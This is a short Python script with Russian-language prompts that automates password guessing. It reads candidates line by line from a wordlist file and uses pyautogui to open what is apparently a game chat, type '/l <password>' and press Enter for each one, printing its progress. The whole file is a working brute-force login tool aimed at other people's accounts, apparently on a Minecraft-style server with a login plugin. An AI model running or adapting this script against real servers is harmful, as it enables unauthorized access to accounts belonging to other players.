import pyautogui, time
from colorama import init, Fore

init(autoreset=True)
texts = ['brut']
number = input("С какой строчки начинать брутить?: ")
time.sleep(3)

if number == "":
	number = 1

for text in texts:
	f = open(f'{text}.txt', 'r')
	lines = 0
	lines_used = 0

	for line in f:
		lines += 1

	f = open(f'{text}.txt', 'r')
	
	for line in f:
		lines_used += 1

		if not lines_used < int(number):
			time.sleep(0.85)
			password = line[:len(line)-1]

			pyautogui.press('t')
			pyautogui.write(f"/l {password}")
			pyautogui.press('enter')

			print(Fore.GREEN + f'[{lines_used}/{lines}] Проверено --> {password}')